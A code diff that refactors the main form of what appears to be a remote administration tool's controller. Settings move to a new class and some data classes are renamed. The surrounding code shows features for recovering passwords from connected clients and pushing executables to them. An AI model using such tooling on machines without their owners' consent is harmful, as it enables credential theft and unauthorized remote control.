@@ -5,13 +5,13 @@ using System.Linq;
 using System.Threading;
 using System.Windows.Forms;
 using xServer.Core.Commands;
+using xServer.Core.Data;
 using xServer.Core.Encryption;
 using xServer.Enums;
 using xServer.Core.Helper;
 using xServer.Core.Networking;
 using xServer.Core.Networking.Utilities;
 using xServer.Core.Utilities;
-using xServer.Settings;
 
 namespace xServer.Forms
 {
@@ -27,47 +27,24 @@ namespace xServer.Forms
         private readonly object _lockClients = new object();
         private bool _titleUpdateRunning;
 
-        private void ReadSettings(bool writeIfNotExist = true)
+        private void ShowTermsOfService()
         {
-            if (writeIfNotExist)
-                XMLSettings.WriteDefaultSettings();
-
-            XMLSettings.ListenPort = ushort.Parse(XMLSettings.ReadValue("ListenPort"));
-            XMLSettings.ShowToU = bool.Parse(XMLSettings.ReadValue("ShowToU"));
-            XMLSettings.AutoListen = bool.Parse(XMLSettings.ReadValue("AutoListen"));
-            XMLSettings.ShowPopup = bool.Parse(XMLSettings.ReadValue("ShowPopup"));
-            XMLSettings.UseUPnP = bool.Parse(XMLSettings.ReadValue("UseUPnP"));
-            XMLSettings.SaveFormat = XMLSettings.ReadValueSafe("SaveFormat", "APP - URL - USER:PASS");
-
-            XMLSettings.ShowToolTip = bool.Parse(XMLSettings.ReadValueSafe("ShowToolTip", "False"));
-            XMLSettings.IntegrateNoIP = bool.Parse(XMLSettings.ReadValueSafe("EnableNoIPUpdater", "False"));
-            XMLSettings.NoIPHost = XMLSettings.ReadValueSafe("NoIPHost");
-            XMLSettings.NoIPUsername = XMLSettings.ReadValueSafe("NoIPUsername");
-            XMLSettings.NoIPPassword = XMLSettings.ReadValueSafe("NoIPPassword");
-
-            XMLSettings.Password = XMLSettings.ReadValue("Password");
-        }
-
-        private void ShowTermsOfService(bool show)
-        {
-            if (show)
+            using (var frm = new FrmTermsOfUse())
             {
-                using (var frm = new FrmTermsOfUse())
-                {
-                    frm.ShowDialog();
-                }
-                Thread.Sleep(300);
+                frm.ShowDialog();
             }
+            Thread.Sleep(300);
         }
 
         public FrmMain()
         {
             Instance = this;
 
-            ReadSettings();
-            AES.PreHashKey(XMLSettings.Password);
+            AES.PreHashKey(Settings.Password);
+
 #if !DEBUG
-            ShowTermsOfService(XMLSettings.ShowToU);
+            if (Settings.ShowToU)
+                ShowTermsOfService();
 #endif
 
             InitializeComponent();
@@ -109,22 +86,22 @@ namespace xServer.Forms
 
         private void AutostartListeningP()
         {
-            if (XMLSettings.AutoListen && XMLSettings.UseUPnP)
+            if (Settings.AutoListen && Settings.UseUPnP)
             {
-                UPnP.Initialize(XMLSettings.ListenPort);
-                ConServer.Listen(XMLSettings.ListenPort);
+                UPnP.Initialize(Settings.ListenPort);
+                ConServer.Listen(Settings.ListenPort);
             }
-            else if (XMLSettings.AutoListen)
+            else if (Settings.AutoListen)
             {
                 UPnP.Initialize();
-                ConServer.Listen(XMLSettings.ListenPort);
+                ConServer.Listen(Settings.ListenPort);
             }
             else
             {
                 UPnP.Initialize();
             }
 
-            if (XMLSettings.IntegrateNoIP)
+            if (Settings.EnableNoIPUpdater)
             {
                 NoIpUpdater.Start();
             }
@@ -139,7 +116,7 @@ namespace xServer.Forms
         private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
         {
             ConServer.Disconnect();
-            UPnP.DeletePortMap(XMLSettings.ListenPort);
+            UPnP.DeletePortMap(Settings.ListenPort);
             nIcon.Visible = false;
             nIcon.Dispose();
             Instance = null;
@@ -391,11 +368,11 @@ namespace xServer.Forms
                 {
                     if (frm.ShowDialog() == DialogResult.OK)
                     {
-                        if (Core.Utilities.Update.UseDownload)
+                        if (Core.Data.Update.UseDownload)
                         {
                             foreach (Client c in GetSelectedClients())
                             {
-                                new Core.Packets.ServerPackets.DoClientUpdate(0, Core.Utilities.Update.DownloadURL, string.Empty, new byte[0x00], 0, 0).Execute(c);
+                                new Core.Packets.ServerPackets.DoClientUpdate(0, Core.Data.Update.DownloadURL, string.Empty, new byte[0x00], 0, 0).Execute(c);
                             }
                         }
                         else
@@ -408,7 +385,7 @@ namespace xServer.Forms
                                     if (c == null) continue;
                                     if (error) continue;
 
-                                    FileSplit srcFile = new FileSplit(Core.Utilities.Update.UploadPath);
+                                    FileSplit srcFile = new FileSplit(Core.Data.Update.UploadPath);
                                     var fileName = FileHelper.GetRandomFilename(8, ".exe");
                                     if (srcFile.MaxBlocks < 0)
                                     {
@@ -629,7 +606,7 @@ namespace xServer.Forms
         {
             if (lstClients.SelectedItems.Count != 0)
             {
-                FrmPasswordRecovery frmPass = new FrmPasswordRecovery(GetSelectedClients().ToList());
+                FrmPasswordRecovery frmPass = new FrmPasswordRecovery(GetSelectedClients());
                 frmPass.Show();
             }
         }
@@ -752,7 +729,7 @@ namespace xServer.Forms
                         foreach (Client c in GetSelectedClients())
                         {
                             new Core.Packets.ServerPackets.DoShowMessageBox(
-                                MessageBoxData.Caption, MessageBoxData.Text, MessageBoxData.Button, MessageBoxData.Icon).Execute(c);
+                                Messagebox.Caption, Messagebox.Text, Messagebox.Button, Messagebox.Icon).Execute(c);
                         }
                     }
                 }
